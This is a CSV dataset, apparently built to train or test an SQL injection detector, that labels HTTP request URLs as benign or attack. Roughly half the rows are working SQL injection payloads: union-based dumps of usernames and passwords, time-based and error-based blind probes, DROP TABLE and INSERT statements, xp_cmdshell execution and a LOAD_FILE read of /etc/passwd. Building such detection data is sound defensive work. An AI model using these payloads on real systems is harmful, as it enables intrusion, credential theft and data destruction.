payload,label
GET http://<HOST>/<PATH>?user=john&age=25,benign
GET http://<HOST>/<PATH>?id=1 AND 1=2 UNION SELECT NULL--,attack
POST http://<HOST>/<PATH>?name=alice&city=london,benign
GET http://<HOST>/<PATH>?id=1;DROP TABLE users--,attack
GET http://<HOST>/<PATH>?sort=asc&filter=active&page=3,benign
"GET http://<HOST>/<PATH>?id=1"" OR ""1""=""1",attack
POST http://<HOST>/<PATH>?email=test@mail.com&token=abc123,benign
GET http://<HOST>/<PATH>?id=1 UNION SELECT username,password FROM users--,attack
GET http://<HOST>/<PATH>?category=news&lang=en&limit=10,benign
GET http://<HOST>/<PATH>?id=1' AND SLEEP(5)--,attack
GET http://<HOST>/<PATH>?ref=xk39d&session=8821fba,benign
GET http://<HOST>/<PATH>?id=1 OR 1=1--,attack
POST http://<HOST>/<PATH>?product=shirt&color=blue&size=M,benign
"GET http://<HOST>/<PATH>?username=admin'--",attack
GET http://<HOST>/<PATH>?search=laptop&price_max=1500,benign
GET http://<HOST>/<PATH>?id=2 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,attack
GET http://<HOST>/<PATH>?page=2&tag=technology,benign
"GET http://<HOST>/<PATH>?id=1' UNION SELECT NULL,NULL,NULL--",attack
POST http://<HOST>/<PATH>?city=jakarta&zip=60111,benign
GET http://<HOST>/<PATH>?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--,attack
GET http://<HOST>/<PATH>?view=grid&items=20&sort=price,benign
"GET http://<HOST>/<PATH>?id=1';EXEC xp_cmdshell('whoami')--",attack
GET http://<HOST>/<PATH>?type=article&author=smith&year=2023,benign
GET http://<HOST>/<PATH>?id=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,0x27,Hex(cast(database() as char)),0x27,0x7e))s), 8446744073709551610, 8446744073709551610)))--,attack
GET http://<HOST>/<PATH>?locale=id_ID&timezone=Asia%2FJakarta,benign
"GET http://<HOST>/<PATH>?id=1' AND ROW(4,1)>(SELECT COUNT(*),CONCAT(0x3a,0x3a,MIN(0),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 4765 UNION SELECT 9921 UNION SELECT 2482 UNION SELECT 9342)a GROUP BY x)--",attack
POST http://<HOST>/<PATH>?ref=landing&campaign=summer2024,benign
GET http://<HOST>/<PATH>?id=1 WAITFOR DELAY '0:0:5'--,attack
GET http://<HOST>/<PATH>?tab=overview&section=stats,benign
"GET http://<HOST>/<PATH>?name=test' OR 'x'='x",attack
GET http://<HOST>/<PATH>?format=json&version=2&fields=id%2Cname,benign
GET http://<HOST>/<PATH>?id=-1 UNION ALL SELECT NULL,@@version,NULL--,attack
POST http://<HOST>/<PATH>?action=subscribe&plan=free,benign
"GET http://<HOST>/<PATH>?id=1;SELECT LOAD_FILE('/etc/passwd')--",attack
GET http://<HOST>/<PATH>?mode=dark&resolution=1080p,benign
GET http://<HOST>/<PATH>?id=1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--,attack
GET http://<HOST>/<PATH>?country=US&currency=USD&market=nyse,benign
"GET http://<HOST>/<PATH>?id=1' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'--",attack
POST http://<HOST>/<PATH>?feedback=great%20service&rating=5,benign
GET http://<HOST>/<PATH>?id=1 OR SLEEP(3)--,attack
GET http://<HOST>/<PATH>?channel=organic&medium=referral,benign
"GET http://<HOST>/<PATH>?id=1')) OR SLEEP(5)--",attack
GET http://<HOST>/<PATH>?device=mobile&os=android&version=13,benign
GET http://<HOST>/<PATH>?id=1 AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1--,attack
POST http://<HOST>/<PATH>?cart_id=8823&qty=2&sku=PX-991,benign
"GET http://<HOST>/<PATH>?pass=1' OR '1'='1'--",attack
GET http://<HOST>/<PATH>?lat=-7.983908&lon=112.621391,benign
GET http://<HOST>/<PATH>?id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>64--,attack
GET http://<HOST>/<PATH>?step=2&wizard=checkout&token=ffb441,benign
GET http://<HOST>/<PATH>?id=1 UNION SELECT table_name FROM information_schema.tables--,attack
GET http://<HOST>/<PATH>?theme=light&sidebar=collapsed,benign
"GET http://<HOST>/<PATH>?id=1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",attack
POST http://<HOST>/<PATH>?invoice=INV-20240601&status=paid,benign
GET http://<HOST>/<PATH>?id=0 OR 1=1 LIMIT 1--,attack
GET http://<HOST>/<PATH>?brand=nike&size=42&color=black,benign
"GET http://<HOST>/<PATH>?id=1') AND SLEEP(5) AND ('abc'='abc",attack
GET http://<HOST>/<PATH>?blog=3&section=comments&offset=0,benign
GET http://<HOST>/<PATH>?id=1 AND (SELECT COUNT(*) FROM users)>0--,attack
GET http://<HOST>/<PATH>?query=javascript+tutorial&source=bing,benign
"GET http://<HOST>/<PATH>?id=1' PROCEDURE ANALYSE(EXTRACTVALUE(5672,CONCAT(0x5c,0x716a6a7a71,(SELECT (CASE WHEN (5672=5672) THEN 1 ELSE 0 END)),0x7178627871)),1)--",attack
POST http://<HOST>/<PATH>?uid=90234&token=gH3kLm9p&action=verify,benign
GET http://<HOST>/<PATH>?id=1 AND (SELECT * FROM users WHERE username=0x61646d696e)--,attack
GET http://<HOST>/<PATH>?report=monthly&dept=finance&fy=2024,benign
"GET http://<HOST>/<PATH>?id=1 AND 2+1-1-1=0+0+0+1 --",attack
GET http://<HOST>/<PATH>?keyword=python+flask&difficulty=beginner,benign
GET http://<HOST>/<PATH>?id=1 UNION SELECT CONCAT(0x7178627871,0x4c6f72656d,0x7178627871)--,attack
GET http://<HOST>/<PATH>?screen=dashboard&role=admin&tenant=t1,benign
"GET http://<HOST>/<PATH>?id=1' AND ELT(5672=5672,SLEEP(5))--",attack
POST http://<HOST>/<PATH>?order_id=ORD-2024-9981&track=enabled,benign
GET http://<HOST>/<PATH>?id=1 AND CHAR(49)=CHAR(49)--,attack
GET http://<HOST>/<PATH>?src=newsletter&week=23&year=2024,benign
"GET http://<HOST>/<PATH>?id=1')) AND EXTRACTVALUE(5672,CONCAT(0x5c,0x716a6a7a71,(SELECT (ELT(5672=5672,1))),0x7178627871))--",attack
GET http://<HOST>/<PATH>?filter=unread&mailbox=inbox&limit=50,benign
GET http://<HOST>/<PATH>?id=1 AND ORD(MID(VERSION(),1,1))>50--,attack
GET http://<HOST>/<PATH>?event=click&element=cta&position=hero,benign
"GET http://<HOST>/<PATH>?id=1' ORDER BY 3--",attack
POST http://<HOST>/<PATH>?session_id=s9k2mm3x&csrf=tz99abc,benign
GET http://<HOST>/<PATH>?id=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,database()))s),1,1)))--,attack
GET http://<HOST>/<PATH>?api_version=v3&output=xml,benign
"GET http://<HOST>/<PATH>?id=1 UNION ALL SELECT NULL,CONCAT(0x7e,user(),0x7e),NULL--",attack
GET http://<HOST>/<PATH>?widget=weather&zip=60601&unit=C,benign
GET http://<HOST>/<PATH>?id=1 AND (SELECT ISNULL(NULLIF(1,1),0))=0--,attack
GET http://<HOST>/<PATH>?category=electronics&rating=4&in_stock=true,benign
"GET http://<HOST>/<PATH>?id=1';INSERT INTO users(username,password) VALUES('hacker','1234')--",attack
GET http://<HOST>/<PATH>?playlist=top40&region=sea&format=mp3,benign
GET http://<HOST>/<PATH>?id=1 AND BENCHMARK(10000000,MD5(1))--,attack
POST http://<HOST>/<PATH>?mode=edit&doc_id=44871&rev=3,benign
"GET http://<HOST>/<PATH>?id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",attack
GET http://<HOST>/<PATH>?zip=10001&radius=10&unit=km,benign
GET http://<HOST>/<PATH>?id=1 UNION SELECT password FROM users WHERE username='admin'--,attack
GET http://<HOST>/<PATH>?feed=rss&topic=sports&count=15,benign
"GET http://<HOST>/<PATH>?id=1' AND (SELECT 9381 FROM(SELECT COUNT(*),CONCAT(0x7178627871,(SELECT (ELT(9381=9381,1))),0x7178627871,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",attack
GET http://<HOST>/<PATH>?album_id=8812&track=04&quality=hd,benign
GET http://<HOST>/<PATH>?id=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)),1)--,attack
POST http://<HOST>/<PATH>?redirect_uri=https%3A%2F%2Fexample.com&grant=code,benign
"GET http://<HOST>/<PATH>?id=1 AND (SELECT 6782 FROM(SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT user()),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",attack
GET http://<HOST>/<PATH>?article=98234&print=true&noads=1,benign
GET http://<HOST>/<PATH>?id=1 OR (SELECT 1 FROM users WHERE username='admin' AND SLEEP(3))--,attack
GET http://<HOST>/<PATH>?currency_from=USD&currency_to=IDR&amount=100,benign
"GET http://<HOST>/<PATH>?id=1' UNION SELECT NULL,NULL,CONCAT(username,0x3a,password) FROM users--",attack
GET http://<HOST>/<PATH>?game=chess&mode=blitz&time=3,benign
GET http://<HOST>/<PATH>?id=1 AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--,attack
POST http://<HOST>/<PATH>?coupon=SAVE20&subtotal=89.99,benign
"GET http://<HOST>/<PATH>?id=1 HAVING 1=1--",attack
GET http://<HOST>/<PATH>?tag=devops&difficulty=advanced&language=en,benign
